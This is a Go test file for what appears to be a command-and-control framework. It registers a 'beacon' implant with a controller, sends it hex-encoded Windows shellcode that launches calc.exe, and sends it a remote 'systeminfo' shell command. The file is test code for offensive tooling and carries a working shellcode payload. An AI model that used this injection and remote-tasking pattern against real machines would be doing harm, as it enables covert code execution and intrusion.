package test

import (
	"context"
	"encoding/hex"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"project/internal/bootstrap"
	"project/internal/messages"
	"project/internal/testsuite"

	"project/beacon"
)

func TestExecuteShellCode(t *testing.T) {
	iNode := generateInitialNodeAndTrust(t)
	iNodeGUID := iNode.GUID()

	// create bootstrap
	iListener, err := iNode.GetListener(InitialNodeListenerTag)
	require.NoError(t, err)
	iAddr := iListener.Addr()
	bListener := &bootstrap.Listener{
		Mode:    iListener.Mode(),
		Network: iAddr.Network(),
		Address: iAddr.String(),
	}
	boot, key := generateBootstrap(t, bListener)
	ctrl.Test.CreateBeaconRegisterRequestChannel()

	// create and run Beacon
	beaconCfg := generateBeaconConfig(t, "Beacon")
	beaconCfg.Register.FirstBoot = boot
	beaconCfg.Register.FirstKey = key
	Beacon, err := beacon.New(beaconCfg)
	require.NoError(t, err)
	go func() {
		err := Beacon.Main()
		require.NoError(t, err)
	}()

	// read Beacon register request
	select {
	case brr := <-ctrl.Test.BeaconRegisterRequest:
		err = ctrl.AcceptRegisterBeacon(brr)
		require.NoError(t, err)
	case <-time.After(3 * time.Second):
		t.Fatal("read Ctrl.Test.BeaconRegisterRequest timeout")
	}
	timer := time.AfterFunc(10*time.Second, func() {
		t.Fatal("beacon register timeout")
	})
	Beacon.Wait()
	timer.Stop()

	// connect Initial Node
	err = Beacon.Synchronize(context.Background(), iNodeGUID, bListener)
	require.NoError(t, err)

	beaconGUID := Beacon.GUID()
	ctrl.EnableInteractiveMode(beaconGUID)

	scHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b52184" +
		"88b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c" +
		"1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4" +
		"818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4" +
		"101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b4" +
		"01c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe" +
		"05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041b" +
		"a318b6f87ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe0750" +
		"5bb4713726f6a00594189daffd563616c632e65786500"
	scBytes, _ := hex.DecodeString(scHex)

	es := messages.ExecuteShellCode{
		Method:    "vp",
		ShellCode: scBytes,
	}
	err = ctrl.SendToBeacon(context.Background(), beaconGUID, messages.CMDBExecuteShellCode, &es)
	require.NoError(t, err)

	time.Sleep(5 * time.Second)

	// clean
	iNode.Exit(nil)
	testsuite.IsDestroyed(t, iNode)
	Beacon.Exit(nil)
	testsuite.IsDestroyed(t, Beacon)

	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
	require.NoError(t, err)
	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
	require.NoError(t, err)
}

func TestShell(t *testing.T) {
	iNode := generateInitialNodeAndTrust(t)
	iNodeGUID := iNode.GUID()

	// create bootstrap
	iListener, err := iNode.GetListener(InitialNodeListenerTag)
	require.NoError(t, err)
	iAddr := iListener.Addr()
	bListener := &bootstrap.Listener{
		Mode:    iListener.Mode(),
		Network: iAddr.Network(),
		Address: iAddr.String(),
	}
	boot, key := generateBootstrap(t, bListener)
	ctrl.Test.CreateBeaconRegisterRequestChannel()

	// create and run Beacon
	beaconCfg := generateBeaconConfig(t, "Beacon")
	beaconCfg.Register.FirstBoot = boot
	beaconCfg.Register.FirstKey = key
	Beacon, err := beacon.New(beaconCfg)
	require.NoError(t, err)
	go func() {
		err := Beacon.Main()
		require.NoError(t, err)
	}()

	// read Beacon register request
	select {
	case brr := <-ctrl.Test.BeaconRegisterRequest:
		err = ctrl.AcceptRegisterBeacon(brr)
		require.NoError(t, err)
	case <-time.After(3 * time.Second):
		t.Fatal("read Ctrl.Test.BeaconRegisterRequest timeout")
	}
	timer := time.AfterFunc(10*time.Second, func() {
		t.Fatal("beacon register timeout")
	})
	Beacon.Wait()
	timer.Stop()

	// connect Initial Node
	err = Beacon.Synchronize(context.Background(), iNodeGUID, bListener)
	require.NoError(t, err)

	beaconGUID := Beacon.GUID()
	ctrl.EnableInteractiveMode(beaconGUID)

	shell := messages.Shell{
		Command: "systeminfo",
	}
	err = ctrl.SendToBeacon(context.Background(), beaconGUID, messages.CMDBShell, &shell)
	require.NoError(t, err)

	time.Sleep(5 * time.Second)

	// clean
	iNode.Exit(nil)
	testsuite.IsDestroyed(t, iNode)
	Beacon.Exit(nil)
	testsuite.IsDestroyed(t, Beacon)

	err = ctrl.DeleteBeaconUnscoped(beaconGUID)
	require.NoError(t, err)
	err = ctrl.DeleteNodeUnscoped(iNodeGUID)
	require.NoError(t, err)
}
